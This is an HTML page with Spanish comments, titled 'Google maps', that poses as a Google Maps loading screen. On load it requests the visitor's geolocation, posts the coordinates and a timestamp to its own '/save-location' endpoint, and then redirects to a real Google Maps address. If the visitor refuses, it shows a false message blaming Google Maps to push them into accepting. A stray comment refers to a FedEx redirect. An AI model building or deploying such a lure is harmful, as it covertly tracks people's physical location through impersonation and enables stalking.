<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google maps</title>
</head>
<style>
    body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
    }
    
    #loading-message {
        font-size: 24px;
        color: #333;
        text-align: center;
        font-weight: bold;
    }
</style>

<body>
    <h1 id="loading-message">Loading</h1>

    <script>
    window.onload = function() {
        // Mostrar mensaje de carga al cargar la página
        const loadingMessage = document.getElementById("loading-message");
        
        // Solicitar la ubicación del usuario
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Crear un objeto con los datos de ubicación
                const locationData = {
                    latitude: latitude,
                    longitude: longitude,
                    timestamp: new Date().toISOString()
                };

                // Enviar los datos al servidor para guardarlos en el archivo JSON
                fetch('/save-location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(locationData)
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data.message);  // Mostrar mensaje de éxito en consola
                })
                .catch(error => {
                    console.error('Error al enviar los datos:', error);
                });

                // Esperar 3 segundos antes de redirigir
                setTimeout(function() {
                    // Cambiar el mensaje de carga
                    loadingMessage.textContent = "Loading to Google Maps...";
                    // Redirigir a la URL de FedEx
                    window.location.href = "https://www.google.com/maps/place/Av+San+Ignacio+1826,+Jardines+de+San+Manuel,+72570+Heroica+Puebla+de+Zaragoza,+Pue./@19.0085842,-98.201741,17z/data=!3m1!4b1!4m6!3m5!1s0x85cfc09f86b4d60d:0x68a962ada163ac92!8m2!3d19.0085791!4d-98.1991607!16s%2Fg%2F11k4k6kn0b?entry=ttu&g_ep=EgoyMDI1MDUwNy4wIKXMDSoASAFQAw%3D%3D";
                }, 3000);
            }, function(error) {
                console.error("Error al obtener la ubicación: " + error.message);
                loadingMessage.textContent = "Google maps no puede obtener la ubicación, para brindarte un mejor servicio acepta la solicitud.";
            });
        } else {
            console.log("La geolocalización no está disponible en este navegador.");
            loadingMessage.textContent = "La geolocalización no está disponible.";
        }
    }
    </script>
</body>
</html>
